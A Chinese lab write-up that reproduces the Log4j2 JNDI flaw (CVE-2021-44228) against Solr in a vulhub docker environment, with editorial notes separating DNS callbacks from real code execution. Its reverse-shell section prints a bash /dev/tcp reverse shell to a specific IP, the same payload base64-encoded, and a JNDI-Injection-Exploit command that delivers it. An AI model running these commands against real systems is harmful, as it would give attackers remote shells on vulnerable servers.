ailx10说：这篇是2023年11月之前写的，后来又改过。Log4j2 名气很大，但我这次不是去找一个叫 Log4j 的网站，而是借使用它的 Solr 来看漏洞。先让输入进入日志，观察 DNS 回调，再接远程工具去验证后面的执行，整个流程比一个 JNDI 字符串多了不少环节。我把这些阶段分开记，是想知道每一步到底说明了什么：发生解析、取到对象和命令真正运行，并不能画等号。做完再回看，日志原本只是记录数据，一旦开始解释里面的内容，信任边界就悄悄变了。

---

编辑核查提示：Log4j 是日志库。DNS 回调、目录服务响应和代码执行是不同阶段；DNS 被解析不等于命令已执行。JDK、配置和网络条件会影响结果。 原题环境、代码、外部工具和历史公网地址未重新验证，图片细字与水印仍需发布前核查。

CVE-2021-44228 涉及 Apache Log4j Core 的 JNDI 查找。本文以历史实验说明可控输入如何进入日志并触发查找；DNS 回调、远程对象处理和实际执行需要分别验证。受影响范围应以 Apache 官方安全公告为准。

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

（2）反弹shell

原实验随后尝试构建受控 JNDI 服务和监听端，并记录进一步的连接结果；这些步骤依赖 JDK、出站访问和服务端配置，不是 DNS 成功后的必然结果。

- base64 编码载荷

```
bash -i >& /dev/tcp/174.137.58.6/8888 0>&1
YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzQuMTM3LjU4LjYvODg4OCAwPiYx
```

- 在自己的VPS上构建 JNDI 服务[\[2\]](#ref_2)

这里需要JNDI注入利用工具，生成JNDI链接并启动后端相关服务，可用于Fastjson、Jackson等相关漏洞的验证。

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzQuMTM3LjU4LjYvODg4OCAwPiYx}|{base64,-d}|{bash,-i}" -A 174.137.58.6
```
